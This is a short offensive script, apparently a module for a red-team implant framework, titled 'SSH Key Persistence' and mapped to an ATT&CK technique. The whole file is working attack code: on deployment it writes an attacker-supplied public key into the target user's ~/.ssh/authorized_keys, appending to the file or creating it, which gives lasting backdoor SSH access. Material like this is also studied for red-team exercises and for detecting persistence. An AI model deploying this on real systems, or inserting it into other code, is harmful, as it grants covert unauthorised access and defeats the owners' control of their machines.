// Title: SSH Key Persistence
// Author: micahjmartin
// Purpose: add a public ssh key to users accounts
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1145

//import:/root/.ssh/id_rsa.pub

// NOTE: You will need to update the path to the public key in order to import without an error

function BeforeDeploy() {
    return true;
}

function Deploy() {
    var filename = USER_INFO.home_dir + "/.ssh/authorized_keys";
    var stat = FileExists(filename);
    if (stat.fileExists) {
        LogInfo("SSH key appended");
        AppendFileBytes(filename, Asset("id_rsa.pub").fileData);
    } else {
        LogInfo("SSH key added");
        WriteFile(filename, Asset("id_rsa.pub").fileData, 400);
    }
    return true;
}

function AfterDeploy() {
    return true;
}
